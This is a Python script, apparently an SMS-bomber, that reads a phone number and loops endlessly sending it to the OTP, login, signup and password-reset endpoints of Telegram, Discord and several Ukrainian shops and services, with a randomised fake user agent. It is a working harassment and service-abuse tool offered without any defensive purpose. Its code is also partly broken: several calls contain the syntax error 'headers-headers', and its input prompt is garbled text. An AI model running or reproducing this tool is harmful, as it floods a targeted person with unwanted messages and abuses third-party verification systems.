import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')



while True:

 try:
     print("Отправлено")
     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print("Не доставлено")
#Телеграм
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#Дискорд
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')	 
     
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#megasport.ua
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
 #zolotakoroleva.ua
 try:
     print('Отправлено')
     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#mozayka.com.ua
 try:
     print('Отправлено')
     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#my.xtra.tv
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#my.xtra.tv/password
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#multiplex.ua
 try:
     print('Отправлено')
     response = requests.post('https://auth.multiplex.ua/login', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://auth.multiplex.ua/login', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://auth.multiplex.ua/login', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://auth.multiplex.ua/login', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#helsi.me
 try:
     print('Отправлено')
     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#ukrzoloto.ua
 try:
     print('Отправлено')
     response = requests.post('https://ukrzoloto.ua/api/login', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://ukrzoloto.ua/api/login', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://ukrzoloto.ua/api/login', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
	 
 try:
     print('Отправлено')
     response = requests.post('https://ukrzoloto.ua/api/login', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')

     time.sleep(500)